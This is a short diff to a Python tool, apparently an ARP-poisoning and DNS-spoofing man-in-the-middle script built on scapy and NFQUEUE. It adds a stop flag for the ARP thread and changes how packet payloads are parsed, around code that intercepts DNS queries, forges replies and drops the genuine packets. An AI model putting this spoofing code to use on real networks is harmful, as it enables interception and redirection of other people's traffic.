@@ -44,10 +44,11 @@ def setup_proxy():
         undo_iptables()
         enable_port_forwarding()
         nfqueue.unbind()
+        dns_spoofing.dns_looping = False
         arp_thread_.join()
 
 def arp_thread():
-    while True:
+    while dns_spoofing.dns_looping:
         dns_spoofing.arp_tick()
         time.sleep(5)
 
@@ -59,7 +60,7 @@ def proxy(packet):
     if packet_nr % 100 == 0:
         dns_spoofing.arp_tick()
 
-    scapy_packet = scapy.IP(packet.get_payload())
+    scapy_packet = scapy.IP(str(packet.get_payload()))
     if dns_spoofing.isDnsQuery(scapy_packet):
         dns_spoofing.dns_spoof(scapy_packet)
         packet.drop()
